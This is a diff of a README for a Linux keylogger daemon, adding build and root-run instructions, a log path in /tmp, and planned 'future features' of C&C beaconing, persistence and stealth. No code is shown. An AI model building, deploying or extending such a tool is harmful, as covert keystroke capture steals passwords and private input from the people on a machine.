@@ -30,6 +30,19 @@ SOFTWARE.
 
 Works on linux. On my Ubuntu keyboard input file is `/dev/input/event7`. This may be different on your system.
 
-Since this keylogger runs as a daemon you won't see errors on stderr. On Ubuntu, you can use `journalctl -t kelogger` to find error messages, or `journalctl -t kelogger -f` to see them appear in real time.
+Since this keylogger runs as a daemon you won't see errors on stderr. On Ubuntu, you can use `journalctl -t kellogger` to find error messages, or `journalctl -t kellogger -f` to see them appear in real time.
 
+#### Usage
+
+```
+make
+```
+
+Just run `./kellogger` as root or `./kellogger <path-to-event-file>`.
+
+Key logs are stored in `/tmp/kellogs.txt`
+
+#### Future features 
+-> Beaconing to C&C Server.
+-> Persistence and Stealth 
 
